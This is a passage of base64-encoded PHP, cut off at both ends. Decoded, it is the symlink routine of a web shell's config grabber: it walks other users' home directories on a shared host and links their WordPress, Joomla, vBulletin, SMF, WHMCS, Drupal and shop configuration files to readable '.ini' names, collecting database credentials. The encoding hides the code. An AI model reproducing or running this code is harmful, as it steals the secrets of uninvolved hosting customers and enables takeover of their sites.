NCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJsb2dzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj5vcmRwcmVzcy1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0uaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52Yi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5wYW5lbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3AtWkNzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtc21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bXMuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnVwbG9hZC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xlbnRzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50Mi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhMS5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZTEwN19jb25maWcucGhwJywkZG9tYWluLid+PmUxMDcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9kYXRhcy9jb25maWcucGhwJywkZG9tYWluLid+PlNlZGl0aW8uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi1mb3J1bS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkIuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+T3RoZXIuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkZG9tYWluLid+fj5pbnZpc2lvLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudHMuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmdzLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlBocEJCLWZvcnVtLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG0uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGRvbWFpbi4nfn4+d2htY3MyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5tYW5nZXdobWNzLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5teXNob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2VzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2FsZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d3AxMy1wcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd2ViLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ob21lLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1wcm90YWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1tYWluLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtdGVzdC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS5zaHRtbCcpIDsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1aQ3Nob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRwZG9tYWluLid+fj5tay1wb3J0YWxlMS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3NtZi9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1zbWYuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW0uaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC91cGxvYWQvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dXBsb2FkLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbC9jb25maWcucGhwJywkZG9tYWluLid+fj5tYWxheS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25